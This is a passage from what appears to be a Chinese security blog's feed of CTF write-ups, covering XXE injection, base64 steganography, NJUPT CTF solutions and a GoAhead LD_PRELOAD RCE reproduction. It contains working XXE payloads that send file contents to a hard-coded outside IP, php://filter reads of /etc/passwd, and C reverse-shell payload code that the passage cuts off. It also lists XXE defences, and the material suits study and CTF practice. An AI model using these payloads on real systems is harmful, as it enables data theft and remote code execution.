class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong><em>payload</em></strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://47.103.62.94:8888/evil.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p><strong><em>evil.dtd</em></strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./1.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;http://47.103.62.94:9999?p=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/12/XXEæ³¨å…¥æ€»ç»“/image-20191219111929470.png" alt="image-20191219111929470"></p><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯è¯»å–çš„æ–‡ä»¶ä¸èƒ½å¤ªå¤§ï¼Œå¦åˆ™ä¼šæŠ¥é”™</p><p><img src="/2019/12/XXEæ³¨å…¥æ€»ç»“/image-20191219112205187.png" alt="image-20191219112205187"></p><p>è¿™é‡Œå¯ä»¥åˆ©ç”¨zlibå‹ç¼©æ•°æ®æµ</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=zlib.deflate/resource=index.php</span><br></pre></td></tr></table></figure><p><strong><em>evil.dtd</em></strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=php://filter/read=zlib.deflate/resource=index.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;http://47.103.62.94:9999?p=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/12/XXEæ³¨å…¥æ€»ç»“/image-20191219194710329.png" alt="image-20191219194710329"></p><p><strong><em>decode.py</em></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">str=<span class="string">""</span> //è§£å¯†çš„å­—ç¬¦ä¸²</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_base64_inflate</span><span class="params">(b64string)</span>:</span></span><br><span class="line">    decode_base64 = base64.b64decode(b64string)</span><br><span class="line">    <span class="keyword">return</span> zlib.decompress(decode_base64,<span class="number">-15</span>)</span><br><span class="line">print(decode_base64_inflate(str))</span><br></pre></td></tr></table></figure><p>æˆ–è€…ç›´æ¥åˆ©ç”¨phpè§£å‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å‹ç¼©ï¼š<span class="keyword">echo</span> file_get_contents(<span class="string">"php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd"</span>);</span><br><span class="line">è§£å‹ï¼š<span class="keyword">echo</span> file_get_contents(<span class="string">"php://filter/read=convert.base64-decode/zlib.inflate/resource=/tmp/1"</span>);</span><br></pre></td></tr></table></figure><p><strong>ä¸‰ä¸¶SVGæ ¼å¼XXEæ³¨å…¥</strong></p><p>è¿™ä¸ªå§¿åŠ¿æ˜¯Google CTF 2019çš„<a href="http://gphotos.ctfcompetition.com:1337/" target="_blank" rel="noopener">æŸé“é¢˜</a> è¿™é“é¢˜çš„<a href="https://docs.google.com/viewerng/viewer?url=https://ctrsec.io/wp-content/uploads/2019/06/Google-CTF-2019-Writeups-Web-gphotos.pptx.pdf&hl=en" target="_blank" rel="noopener">WP</a> (æ³¨æ„ç½‘ç»œ)å­¦åˆ°çš„</p><p><strong><em>svg.php</em></strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line">$xml=<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE svg [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % remote SYSTEM "http://47.103.62.94:8080/evil.dtd"&gt;</span></span><br><span class="line"><span class="string">%remote;%int;%send;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="28px" height="22px" viewBox="0 0 28 22" enable-background="new 0 0 28 22" xml:space="preserve"&gt;  &lt;image id="image0" width="28" height="22" x="0" y="0"href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgA"&gt;</span></span><br><span class="line"><span class="string">&lt;/svg&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">$domcument = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$domcument-&gt;loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">$img = simplexml_import_dom($domcument);</span><br><span class="line">$attrs = $img-&gt;attributes();</span><br><span class="line">$width = (int) $attrs-&gt;width;</span><br><span class="line">$height = (int) $attrs-&gt;height;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2019/12/XXEæ³¨å…¥æ€»ç»“/image-20191219192450371.png" alt="image-20191219192450371"></p><p>è™½ç„¶æŠ¥äº†ä¸€å¤§å †é”™ä½†æ•°æ®å·²ç»å¸¦å‡ºæ¥äº†</p><p>åé¢å‘ç°ç›´æ¥ç”¨ç›²æ³¨çš„payloadä¹Ÿè¡Œ</p><p><img src="/2019/12/XXEæ³¨å…¥æ€»ç»“/image-20191220233828942.png" alt="image-20191220233828942"></p><p><strong><em>å››ã€å„ç§å¹³å°ä¸Šæ”¯æŒåè®®</em></strong></p><p><img src="/2019/12/XXEæ³¨å…¥æ€»ç»“/20181120002647-e93bbf00-ec17-1.png" alt="20181120002647-e93bbf00-ec17-1"></p><p><strong><em>äº”ã€HTTPå†…ç½‘ä¸»æœºæ¢æµ‹</em></strong></p><p>å°è¯•è¯»å–ç½‘ç»œé…ç½®æ–‡ä»¶</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta-keyword">/etc/</span>network/interfaces</span><br><span class="line"></span><br><span class="line"><span class="meta-keyword">/proc/</span>net/arp</span><br><span class="line"></span><br><span class="line"><span class="meta-keyword">/etc/</span>hosts</span><br></pre></td></tr></table></figure><p><img src="/2019/12/XXEæ³¨å…¥æ€»ç»“/image-20191219225251465.png" alt="image-20191219225251465"></p><p><img src="/2019/12/XXEæ³¨å…¥æ€»ç»“/image-20191219225453109.png" alt="image-20191219225453109"></p><p><img src="/2019/12/XXEæ³¨å…¥æ€»ç»“/image-20191219231126267.png" alt="image-20191219231126267"></p><p>ç„¶åé€šè¿‡BurpSuitçš„æµ‹è¯•å™¨å®Œæˆä¸»æœºå’Œç«¯å£æ¢æµ‹</p><p><strong>å…­ã€é˜²å¾¡XXE</strong></p><p><strong><em>PHPï¼š</em></strong></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">libxml_disable_entity_loader</span>(<span class="variable"><span class="literal">true</span></span>);</span></span><br></pre></td></tr></table></figure><p><strong><em>JAVA:</em></strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf =<span class="module-access"><span class="module"><span class="identifier">DocumentBuilderFactory</span>.</span></span><span class="keyword">new</span><span class="constructor">Instance()</span>;</span><br><span class="line">dbf.set<span class="constructor">ExpandEntityReferences(<span class="params">false</span>)</span>;</span><br><span class="line"></span><br><span class="line">.set<span class="constructor">Feature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>,<span class="params">true</span>)</span>;</span><br><span class="line"></span><br><span class="line">.set<span class="constructor">Feature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>,<span class="params">false</span>)</span></span><br><span class="line"></span><br><span class="line">.set<span class="constructor">Feature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>,<span class="params">false</span>)</span>;</span><br></pre></td></tr></table></figure><p><strong><em>Pythonï¼š</em></strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(<span class="attribute">resolve_entities</span>=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure><p><a href="https://4o4notfound.org/index.php/archives/29/" target="_blank" rel="noopener">XXEæ¼æ´åˆ†æ</a></p><p><a href="https://xz.aliyun.com/t/3357#toc-5" target="_blank" rel="noopener">ä¸€ç¯‡æ–‡ç« å¸¦ä½ æ·±å…¥ç†è§£æ¼æ´ä¹‹ XXE æ¼æ´</a></p>]]></content>
    
    <summary type="html">
    
      XXEçš„åŸºç¡€çŸ¥è¯†å°±ä¸è¯´äº†ï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šæ–‡ç« ã€‚
    
    </summary>
    
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/categories/CTF/"/>
    
    
      <category term="XXE" scheme="https://0xcreed.jxustctf.top/tags/XXE/"/>
    
      <category term="æ³¨å…¥" scheme="https://0xcreed.jxustctf.top/tags/%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>base64éšå†™</title>
    <link href="https://0xcreed.jxustctf.top/2019/12/base64%E9%9A%90%E5%86%99/"/>
    <id>https://0xcreed.jxustctf.top/2019/12/base64éšå†™/</id>
    <published>2019-12-18T11:44:08.000Z</published>
    <updated>2020-04-13T10:31:27.707Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>è¿™ç§base64éšå†™ç‰¹å¾å¾ˆæ˜æ˜¾ï¼Œå°±æ˜¯ä½ ä¼šå¾—åˆ°ä¸€å¤§å †base64çš„å­—ç¬¦ä¸²ä½†å´æ— æ³•è§£ç ã€‚å†™è¿‡è¿™é¢˜å°±å¾ˆç®€å•ï¼Œä½†base64çš„åŸç†å€¼å¾—æˆ‘ä»¬å»ç ”ç©¶ä¸€ä¸‹ã€‚<a href="https://www.tr0y.wang/2017/06/14/Base64steg/index.html" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« </a></p><h2 id="ç”Ÿæˆæ­£å¸¸çš„æœ‰ç­‰å·çš„base64å­—ç¬¦ä¸²"><a href="#ç”Ÿæˆæ­£å¸¸çš„æœ‰ç­‰å·çš„base64å­—ç¬¦ä¸²" class="headerlink" title="ç”Ÿæˆæ­£å¸¸çš„æœ‰ç­‰å·çš„base64å­—ç¬¦ä¸²"></a>ç”Ÿæˆæ­£å¸¸çš„æœ‰ç­‰å·çš„base64å­—ç¬¦ä¸²</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">b64chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'0.txt'</span>,<span class="string">'wb+'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        ran_str = <span class="string">''</span>.join(random.sample(string.ascii_letters + string.digits, <span class="number">13</span>))</span><br><span class="line">        base64str = base64.b64encode(ran_str)</span><br><span class="line">        fp.write(base64str + <span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="åŠ å¯†"><a href="#åŠ å¯†" class="headerlink" title="åŠ å¯†"></a>åŠ å¯†</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: cp936 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flag = <span class="string">'Tr0y&#123;Base64isF4n&#125;'</span>  <span class="comment"># flag</span></span><br><span class="line">bin_str = <span class="string">''</span>.join([bin(ord(c)).replace(<span class="string">'0b'</span>, <span class="string">''</span>).zfill(<span class="number">8</span>) <span class="keyword">for</span> c <span class="keyword">in</span> flag])</span><br><span class="line">base64chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'0.txt'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f0, open(<span class="string">'1.txt'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f1:  <span class="comment"># '0.txt'æ˜¯æ˜æ–‡, '1.txt'ç”¨äºå­˜æ”¾éšå†™åçš„ base64</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f0.readlines():</span><br><span class="line">        rowstr = base64.b64encode(line.replace(<span class="string">'\n'</span>, <span class="string">''</span>))</span><br><span class="line">        equalnum = rowstr.count(<span class="string">'='</span>)</span><br><span class="line">        <span class="keyword">if</span> equalnum <span class="keyword">and</span> len(bin_str):</span><br><span class="line">            offset = int(<span class="string">'0b'</span> + bin_str[:equalnum * <span class="number">2</span>], <span class="number">2</span>)</span><br><span class="line">            char = rowstr[len(rowstr) - equalnum - <span class="number">1</span>]</span><br><span class="line">            rowstr = rowstr.replace(char, base64chars[base64chars.index(char) + offset])</span><br><span class="line">            bin_str = bin_str[equalnum * <span class="number">2</span>:]</span><br><span class="line">        f1.write(rowstr + <span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure><h2 id="è§£å¯†"><a href="#è§£å¯†" class="headerlink" title="è§£å¯†"></a>è§£å¯†</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: cp936 -*-</span></span><br><span class="line">b64chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'1.txt'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    bin_str = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        stegb64 = <span class="string">''</span>.join(line.split())</span><br><span class="line">        rowb64 = <span class="string">''</span>.join(stegb64.decode(<span class="string">'base64'</span>).encode(<span class="string">'base64'</span>).split())</span><br><span class="line">        offset = abs(b64chars.index(stegb64.replace(<span class="string">'='</span>, <span class="string">''</span>)[<span class="number">-1</span>]) - b64chars.index(rowb64.replace(<span class="string">'='</span>, <span class="string">''</span>)[<span class="number">-1</span>]))</span><br><span class="line">        equalnum = stegb64.count(<span class="string">'='</span>)  <span class="comment"># no equalnum no offset</span></span><br><span class="line">        <span class="keyword">if</span> equalnum:</span><br><span class="line">            bin_str += bin(offset)[<span class="number">2</span>:].zfill(equalnum * <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">''</span>.join([chr(int(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(bin_str), <span class="number">8</span>)])  <span class="comment"># 8 ä½ä¸€ç»„</span></span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">githubæœ‰ä¸ªå·¥å…·</span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/jerrita/</span>b64steg</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      æ‰“çœèµ›çš„æ—¶å€™é‡åˆ°çš„è®°å½•ä¸€ä¸‹å§
    
    </summary>
    
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/categories/CTF/"/>
    
    
      <category term="base64" scheme="https://0xcreed.jxustctf.top/tags/base64/"/>
    
  </entry>
  
  <entry>
    <title>2019NJUPT_CTF_WP</title>
    <link href="https://0xcreed.jxustctf.top/2019/11/2019NJUPT-CTF-WP/"/>
    <id>https://0xcreed.jxustctf.top/2019/11/2019NJUPT-CTF-WP/</id>
    <published>2019-11-22T14:14:46.000Z</published>
    <updated>2020-03-18T11:31:44.214Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Fake-XML-cookbook"><a href="#Fake-XML-cookbook" class="headerlink" title="Fake XML cookbook"></a>Fake XML cookbook</h2><p>ç®€å•çš„XML</p><p><img src="/2019/11/2019NJUPT-CTF-WP/image-20191122221701015.png" alt="image-20191122221701015"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=../../../flag" &gt;]&gt;</span>     </span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>1<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="True-XML-cookbook"><a href="#True-XML-cookbook" class="headerlink" title="True XML cookbook"></a>True XML cookbook</h3><p>æ¥ç€ç”¨ä¸Šé¢çš„payload</p><p><img src="/2019/11/2019NJUPT-CTF-WP/image-20191122222006279.png" alt="image-20191122222006279"></p><p>æ­£å¦‚æç¤ºæ‰€è¯´ï¼Œè¦åˆ©ç”¨xmlåšæ›´å¤šçš„äº‹æƒ…</p><h3 id="Upload-your-Shell"><a href="#Upload-your-Shell" class="headerlink" title="Upload your Shell"></a>Upload your Shell</h3><p>é¢˜ç›®æœ‰ä¸€äº›è¿‡æ»¤ åç¼€å¿…é¡»æ˜¯å›¾ç‰‡çš„åç¼€</p><p>æ–‡ä»¶ä¸­ä¸èƒ½å‡ºç° <code>?&gt;</code></p><p>ä¸Šä¼ åphpä»£ç æˆåŠŸå°±ç›´æ¥ç»™flagçš„ä½ç½®</p><p><img src="/2019/11/2019NJUPT-CTF-WP/image-20191122225502634.png" alt="image-20191122225502634"></p><p>æƒ³åˆ°é¡µé¢ä¸­æœ‰ä¸ªactionå‚æ•°</p><p>æŠŠflagçš„ä½ç½®ç»™actionå¾—åˆ°flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://nctf2019.x1ct34m.com:60002/index.php?action=/var/www/html/upload-imgs/e8849c5939285e7053ba8d7af6cb1c25/Th1s_is_a_fl4g.jpg</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      ç­¾åˆ°é¢˜å†™å®Œï¼Œæ¯”èµ›ç»“æŸ
    
    </summary>
    
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/categories/CTF/"/>
    
    
      <category term="WP" scheme="https://0xcreed.jxustctf.top/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>æ¹–æ¹˜æ¯2019å¤ç°</title>
    <link href="https://0xcreed.jxustctf.top/2019/11/2019%E6%B9%96%E6%B9%98%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/"/>
    <id>https://0xcreed.jxustctf.top/2019/11/2019æ¹–æ¹˜æ¯webå¤ç°/</id>
    <published>2019-11-09T13:34:34.000Z</published>
    <updated>2019-11-09T14:32:50.551Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id><a href="#" class="headerlink" title></a></h2><p>æ‰“å¼€<a href="http://183.129.189.62:13900/index.html" target="_blank" rel="noopener">é“¾æ¥</a>,æ²¡ä»€ä¹ˆä¸œè¥¿ã€‚</p><p>æŸ¥çœ‹æºç </p><p><img src="/2019/11/2019æ¹–æ¹˜æ¯webå¤ç°/image-20191109213839151.png" alt="image-20191109213839151"></p><p>è¿›å…¥æç¤ºçš„é¡µé¢</p><p><img src="/2019/11/2019æ¹–æ¹˜æ¯webå¤ç°/image-20191109214035812.png" alt="image-20191109214035812"></p><p>å‘ç°æ˜¯GoAhead/3.6.4</p><p>ç™¾åº¦äº†ä¸€ä¸‹ï¼Œå‘ç° GoAhead 3.6.5ä¹‹å‰çš„ç‰ˆæœ¬ï¼ˆ2.5.0 â€“ 3.6.4ï¼‰ æœ‰ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œçš„æ¼æ´</p><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>GoAheadåœ¨æ¥æ”¶åˆ°è¯·æ±‚åï¼Œå°†ä¼šä»URLå‚æ•°ä¸­å–å‡ºé”®å’Œå€¼æ³¨å†Œè¿›CGIç¨‹åºçš„ç¯å¢ƒå˜é‡ï¼Œä¸”åªè¿‡æ»¤äº†REMOTE_HOSTå’ŒHTTP_AUTHORIZATIONã€‚æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶ç¯å¢ƒå˜é‡ï¼Œå°±æœ‰å¾ˆå¤šæ”»å‡»æ–¹å¼ã€‚æ¯”å¦‚åœ¨Linuxä¸­ï¼ŒLD_å¼€å¤´çš„ç¯å¢ƒå˜é‡å’ŒåŠ¨æ€é“¾æ¥åº“æœ‰å…³ï¼Œå¦‚LD_PRELOADä¸­æŒ‡å®šçš„åŠ¨æ€é“¾æ¥åº“ï¼Œå°†ä¼šè¢«è‡ªåŠ¨åŠ è½½ï¼›LD_LIBRARY_PATHæŒ‡å®šçš„è·¯å¾„ï¼Œç¨‹åºä¼šå»å…¶ä¸­å¯»æ‰¾åŠ¨æ€é“¾æ¥åº“ã€‚</p><a id="more"></a><p>æˆ‘ä»¬å¯ä»¥æŒ‡å®šLD_PRELOAD=/proc/self/fd/0ï¼Œå› ä¸º/proc/self/fd/0æ˜¯æ ‡å‡†è¾“å…¥ï¼Œè€Œåœ¨CGIç¨‹åºä¸­ï¼ŒPOSTæ•°æ®æµå³ä¸ºæ ‡å‡†è¾“å…¥æµã€‚æˆ‘ä»¬ç¼–è¯‘ä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“ï¼Œå°†å…¶æ”¾åœ¨POST Bodyä¸­ï¼Œå‘é€ç»™<a href="https://link.jianshu.com?t=http%3A%2F%2Ftarget%2Fcgi-bin%2Findex%3FLD_PRELOAD%3D%2Fproc%2Fself%2Ffd%2F0" target="_blank" rel="noopener">http://target/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0</a>ï¼ŒCGIå°±ä¼šåŠ è½½æˆ‘ä»¬å‘é€çš„åŠ¨æ€é“¾æ¥åº“ï¼Œé€ æˆè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</p><h3 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h3><p>æ¼æ´äº§ç”Ÿäºgoahead/src/cgi.c:cgiHandlerä¸­ï¼Œç¨‹åºéå†äº†ç”¨æˆ·è®¿é—®æ—¶æ‰€å¸¦çš„å‚æ•°ï¼ŒéªŒè¯å¦‚æœå‚æ•°ä¸ä¸ºREMOTE_HOSTæˆ–HTTP_AUTHORIZATIONï¼Œåˆ™å°†å…¶å­˜å‚¨è‡³envpæ•°ç»„ã€‚<br> è¯¥æ•°ç»„å°†ä½œä¸ºæ¥ä¸‹æ¥cgiè°ƒç”¨çš„ç¯å¢ƒå˜é‡ã€‚å¯ä»¥çœ‹å‡ºæ­£æ˜¯è¿™é‡Œå¯¹äºå‚æ•°çš„è¿‡æ»¤ä¸å…¨ï¼Œå¯¼è‡´äº†ç”¨æˆ·å¯ä»¥ä¿®æ”¹CGIç¨‹åºçš„LD_PRELOADç¯å¢ƒå˜é‡,è‡´ä½¿æ¼æ´å­˜åœ¨ã€‚</p><h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>ç¼–å†™payload.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">before_main</span><span class="params">(<span class="keyword">void</span>)</span> __<span class="title">attribute__</span><span class="params">((constructor))</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">before_main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> sock = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">attacker_addr</span> = &#123;</span><span class="number">0</span>&#125;;</span><br><span class="line">attacker_addr.sin_family = AF_INET;</span><br><span class="line">attacker_addr.sin_port = htons(<span class="number">1234</span>);</span><br><span class="line">attacker_addr.sin_addr.s_addr = inet_addr(<span class="string">"ipåœ°å€"</span>);</span><br><span class="line"><span class="keyword">if</span>(connect(sock, (struct sockaddr *)&amp;attacker_addr,<span 